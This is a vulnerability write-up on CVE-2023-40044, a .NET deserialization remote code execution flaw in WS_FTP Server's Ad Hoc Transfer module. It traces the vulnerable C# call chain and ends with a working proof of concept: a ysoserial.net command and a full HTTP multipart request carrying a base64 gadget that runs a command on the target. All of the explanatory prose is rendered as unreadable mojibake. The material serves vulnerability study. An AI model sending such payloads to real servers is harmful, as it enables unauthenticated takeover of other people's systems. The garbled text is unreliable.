---
title: "Progress WS_FTP Server RCE (CVE-2023-40044)"
date: 2023-10-08T14:24:16+08:00
draft: false
showSummary: true
summary: "CVE-2023-40044"
slug: "Progress+WS_FTP+Server+RCE-CVE-2023-40044"
tags: ["WS_FTP", "CVE", "RCE"]
---

## ğŸ“– æ¼æ´ç°¡ä»‹
åœ¨ WS_FTP Server 8.7.4 å’Œ 8.8.2 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œæœªç¶“èº«åˆ†é©—è­‰çš„æ”»æ“Šè€…å¯ä»¥åœ¨ Ad Hoc Transfer æ¨¡çµ„ä¸­åˆ©ç”¨ .NET ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨ WS_FTP Server ç³»çµ±ä¸Šé€²è¡Œé ç«¯å‘½ä»¤åŸ·è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒWS_FTP Server çš„ Ad Hoc Transfer æ¨¡çµ„æ˜¯æ¨™æº–å®‰è£çš„ä¸€éƒ¨åˆ†ï¼Œå¤§éƒ¨åˆ†çš„ WS_FTP Server éƒ½æœƒå—å½±éŸ¿ã€‚Progress Software çš„å»ºè­°æ˜¯æ‰€æœ‰å®¢æˆ¶éƒ½è¦å‡ç´šåˆ°æœ€æ–°çš„è»Ÿé«”ç‰ˆæœ¬ï¼Œæˆ–è€…åˆªé™¤/åœç”¨ Ad Hoc Transfer æ¨¡çµ„ã€‚

æ­¤æ¼æ´æ˜¯ç”± [Assetnote](https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044) æ‰€ç™¼ç¾ï¼Œæœªç¶“èº«åˆ†é©—è­‰çš„æ”»æ“Šè€…å¾ˆå®¹æ˜“å°±èƒ½åœ¨ç›®æ¨™ç³»çµ±ä¸Šå¯¦ç¾ RCEã€‚

[Rapid7](https://www.rapid7.com/blog/post/2023/09/29/etr-critical-vulnerabilities-in-ws_ftp-server/) è§€å¯Ÿåˆ°æ­¤æ¼æ´åœ¨é‡å¤–å·²ç¶“è¢«åˆ©ç”¨äº†ã€‚è€Œä¸”ï¼ŒCISA ä¹Ÿæ ¹æ“šä¸»å‹•åˆ©ç”¨çš„è­‰æ“šï¼Œå°‡æš´éœ²æƒ…æ³åŠ å…¥åˆ°å…¶[å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´ç›®éŒ„ (Known Exploited Vulnerabilities Catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) ä¹‹ä¸­ã€‚

æ­¤æ¼æ´çš„ CVE ç·¨è™Ÿå·²è¢«æŒ‡å®šç‚º CVE-2023-40044ï¼Œå…¶ CVSSv3 è©•åˆ†è‡³å°‘ç‚º 8.8ï¼Œåš´é‡åº¦é«˜ã€‚

### å—å½±éŸ¿çš„ç”¢å“
å¦‚æœå•Ÿç”¨äº† Ad Hoc Transfer æ¨¡çµ„ï¼Œå‰‡ä»¥ä¸‹è»Ÿé«”ç‰ˆæœ¬éƒ½æœƒå—åˆ°å½±éŸ¿ï¼š

- 2022.0.1 (8.8.1)
- 2022.0 (8.8.0)
- 2020.0.0 (8.7.0)
- 2020.0.1 (8.7.1)
- 2020.0.2 (8.7.2)
- 2020.0.3 (8.7.3)

## ğŸ•µï¸ åˆ†æ

### FormStream Class
é€™å€‹æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ä¸å®‰å…¨çš„ååºåˆ—åŒ–ã€‚å­˜åœ¨æ¼æ´çš„ `DeserializeProcessor()` æ–¹æ³•å˜—è©¦ååºåˆ—åŒ–ä½¿ç”¨è€…å¯æ§ï¼Œä¸”æ²’æœ‰ç¶“éæª¢æŸ¥æˆ–ç¢ºèªçš„è³‡æ–™ã€‚

```C#
internal IFileProcessor DeserializeProcessor(string input)
{
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    MemoryStream serializationStream1 = new MemoryStream(Convert.FromBase64String(input));
    SettingsStorageObject settingsStorageObject = (SettingsStorageObject) binaryFormatter.Deserialize((Stream) serializationStream1); // <-- ä¸å®‰å…¨çš„ååºåˆ—åŒ–
```

å˜—è©¦å¾€å‰è¿½æœƒç™¼ç¾ `DeserializeProcessor()` æ–¹æ³•è¢« `CheckForActionFields()` æ–¹æ³•æ‰€å‘¼å«ã€‚è€Œ `CheckForActionFields()` æ–¹æ³•æœƒå˜—è©¦æå– multipart æ¬„ä½ä¸­ `::AHT_DEFAULT_UPLOAD_PARAMETER::` ä¹‹å¾Œçš„å­—ä¸²ï¼Œç„¶å¾Œå°‡è©²å­—ä¸²äº¤çµ¦ `DeserializeProcessor()` æ–¹æ³•é€²è¡Œååºåˆ—åŒ–ã€‚

æ­¤å¤–, `::AHT_UPLOAD_PARAMETER::` çš„å­˜åœ¨ä¼¼ä¹ä¹Ÿæœƒè§¸ç™¼ç›¸åŒçš„ä¸å®‰å…¨ååºåˆ—åŒ–éç¨‹ã€‚

```C#
private void CheckForActionFields()
{
    byte[] array = this._currentField.ToArray();
    string result1 = string.Empty;
    int boundaryPos = this.IndexOf(array, this.BOUNDARY);
    if (!this.TryParseActionField(this.ID_TAG, array, out result1, boundaryPos))
    {
    string result2 = string.Empty;
    if (this.TryParseActionField(this.DEFAULT_PARAMS_TAG, array, out result2, boundaryPos))  // <-- ::AHT_DEFAULT_UPLOAD_PARAMETER::
    {
        this._defaultProcessor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.DEFAULT_PARAMS_TAG.Length));  // <-- ä¸å®‰å…¨çš„ååºåˆ—åŒ–
        this._processor = this._defaultProcessor;
        this._currentField = new MemoryStream();
    }
    else if (this.TryParseActionField(this.PARAMS_TAG, array, out result2, boundaryPos))  // <-- ::AHT_UPLOAD_PARAMETER::
    {
        this._processor = UploadManager.Instance.DeserializeProcessor(result2.Substring(this.PARAMS_TAG.Length)); // <-- ä¸å®‰å…¨çš„ååºåˆ—åŒ–
        this._currentField = new MemoryStream();
    }
```

è¦åˆ°é” `CheckForActionFields()` æ–¹æ³•ï¼Œéœ€è¦ä¾åºå‘¼å« `ProcessField()` å’Œ `Write()` æ–¹æ³•ã€‚

```C#
private FormStream.SectionResult ProcessField(byte[] bytes, int pos)
{
    int nextOffset1 = -1;
    if (pos < bytes.Length - 1)
    {
    nextOffset1 = this.IndexOf(bytes, this.BOUNDARY, pos + 1);
    if (nextOffset1 != -1 && this._inFile)
        nextOffset1 -= 2;
    }
    if (nextOffset1 >= 0)
    {
    this.WriteBytes(this._inFile, bytes, pos, nextOffset1 - pos);
    if (!this._inFile)
        this.CheckForActionFields(); // <-- å­˜åœ¨æ¼æ´çš„æ–¹æ³•
```

`Write()` æ–¹æ³•æœƒéæ­· HTTP form-dataï¼Œæœå°‹é‚Šç•Œå­—ä¸²ä¸¦è§£ææ¯å€‹æ¬„ä½çš„æ¨™é ­ã€‚ è¦è§¸ç™¼ `ProcessField()` æ–¹æ³•ï¼Œå¿…é ˆæ»¿è¶³ä»¥ä¸‹æ¢ä»¶ï¼š
1. `this._inField` å¿…é ˆç‚º `true`
2. multipart æ¬„ä½çš„æ¨™é ­ä¸èƒ½åŒ…å« `filename` ä»¥åŠ `Content-Disposition`
3. `this._inFile` å¿…é ˆæ˜¯ `false`

```C#
public override void Write(byte[] bytes, int offset, int count)
{
    int num1 = 0;
    byte[] numArray;
    if (this._buffer != null)
    {
    numArray = new byte[this._buffer.Length + count];
    Buffer.BlockCopy((Array) this._buffer, 0, (Array) numArray, 0, this._buffer.Length);
    Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, this._buffer.Length, count);
    }
    else
    {
    numArray = new byte[count];
    Buffer.BlockCopy((Array) bytes, offset, (Array) numArray, 0, count);
    }
    this._position += (long) count;
    int srcOffset;
    int num2;
    FormStream.SectionResult sectionResult;
    do
    {
    if (this._headerNeeded)
    {
        srcOffset = num1;
        num2 = this.IndexOf(numArray, this.BOUNDARY, num1);
        if (num2 >= 0)
        {
        if (this.IndexOf(numArray, this.EOF, num2) != num2)
        {
            int num3 = this.IndexOf(numArray, this.EOH, num2);
            if (num3 >= 0)
            {
            this._inField = true; // <-- _inField = true
            this._headerNeeded = false;
            Dictionary<string, string> header = this.ParseHeader(numArray, num2);
            if (header != null)
            {
                if (header.ContainsKey("filename") && header.ContainsKey("Content-Disposition")) // <-- å¿…é ˆæ˜¯ false
                {
                string fileName = header["filename"].Trim('"').Trim();
                if (!string.IsNullOrEmpty(fileName))
                {
                    try
                    {
                    this._fileName = header["filename"].Trim('"');
                    this._inFile = true;
                    string contentType = !header.ContainsKey("Content-Type") ? "application/octet-stream" : header["Content-Type"];
                    this.fileProccessingEnded = false;
                    object identifier = this._processor.StartNewFile(fileName, contentType, header, this._previousFields);
                    this.OnFileStarted(fileName, identifier);
                    }
                    catch (Exception ex)
                    {
                    this._fileError = true;
                    this.OnError(ex);
                    }
                }
                }
                else
                {
                this._inFile = false; // <-- _inFile = false
                this._currentField = new MemoryStream();
                this._currentFieldName = header["name"];
                }
                num1 = num3 + 4;
            }
            else
                goto label_9;
            }
            else
            goto label_17;
        }
        else
            goto label_6;
        }
        else
        goto label_18;
    }
    if (this._inField)
    {
        this._buffer = (byte[]) null;
        sectionResult = this.ProcessField(numArray, num1); // <-- å­˜åœ¨æ¼æ´çš„æ–¹æ³•
```

### UploadModule Class
`UploadModule` ç¢ºå®šå‚³å…¥çš„ HTTP è«‹æ±‚æ˜¯å¦æ˜¯ multipart æª”æ¡ˆä¸Šå‚³ã€‚å¦‚æœæ˜¯ multipart æª”æ¡ˆä¸Šå‚³ï¼Œ`Context_AcquireRequestState()` æ–¹æ³•å°‡æœƒå»ºç«‹ä¸€å€‹`FormStream`ç‰©ä»¶ï¼Œè©²ç‰©ä»¶æœƒå‘¼å« `Write()` æ–¹æ³•ä¾†è™•ç†æ­¤è«‹æ±‚ã€‚

```C#
public class UploadModule : IHttpModule
{
    private void Context_AcquireRequestState(object sender, EventArgs e)
    {
        // ...
        string boundary = "--" + knownRequestHeader.Substring(knownRequestHeader.IndexOf("boundary=") + "boundary=".Length);
        using (FormStream formStream = new FormStream(this.GetProcessor(), boundary, app.Request.ContentEncoding))
        {
            formStream.FileCompleted += new FileEventHandler(this.fs_FileCompleted);
            formStream.FileCompletedError += new FileErrorEventHandler(this.fs_FileCompletedError);
            formStream.FileStarted += new FileEventHandler(this.fs_FileStarted);
            formStream.Error += new ErrorEventHandler(this.OnTransactionAborted);
            this._context = app.Context;
            long bytes = 0;
            if (workerRequest.GetPreloadedEntityBodyLength() > 0)
            {
            byte[] preloadedEntityBody = workerRequest.GetPreloadedEntityBody();
            formStream.Write(preloadedEntityBody, 0, preloadedEntityBody.Length); // <-- å­˜åœ¨æ¼æ´çš„æ–¹æ³•
```

åœ¨ WS_FTP Ad Hoc Transfer æ‡‰ç”¨ç¨‹å¼çš„ `web.config` ä¸­ï¼Œ`MyFileUpload.UploadModule` æ¨¡çµ„æœƒè¢«è¼‰å…¥åˆ° IIS HTTP æ¨¡çµ„ä¸­ï¼Œä¸¦è™•ç†å‚³å…¥çš„æª”æ¡ˆä¸Šå‚³è«‹æ±‚ã€‚å› æ­¤ï¼Œç™¼é€è‡³ Ad Hoc Transfer æ¨¡çµ„ä¸­ä»¥ `/AHT/` ç‚ºé–‹é ­çš„ URI çš„ multipart HTTP è«‹æ±‚éƒ½å¯èƒ½è§¸ç™¼æ¼æ´ã€‚

```xml
<httpModules>
    <add name="extend_session_module" type="AHT.Main.ExtendUserSessionModule" />
    <add name="upload_module" type="MyFileUpload.UploadModule, fileuploadlibrary, Version=4.0.0.0" />
</httpModules>
```

### PoC
åˆ©ç”¨ [ysoserial.net](https://github.com/pwntester/ysoserial.net) ä¾†ç”¢ç”Ÿ .NET ååºåˆ—åŒ–é…¬è¼‰ï¼š
```PowerShell
.\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "notepad.exe" -o base64
```

HTTP multipart POST è«‹æ±‚ï¼š
```HTTP
POST /AHT/AhtApiService.asmx/AuthUser HTTP/1.1
Host: victim.com
User-Agent: CVE-2023-40044
Accept: */*
Content-Length: 1303
Content-Type: multipart/form-data; boundary=boundary

--boundary
name: PoC

::AHT_DEFAULT_UPLOAD_PARAMETER::AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5vdGVwYWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=
--boundaryâ€“
```

## ğŸ“Œ åƒè€ƒè³‡æ–™
- https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023
- https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044
- https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis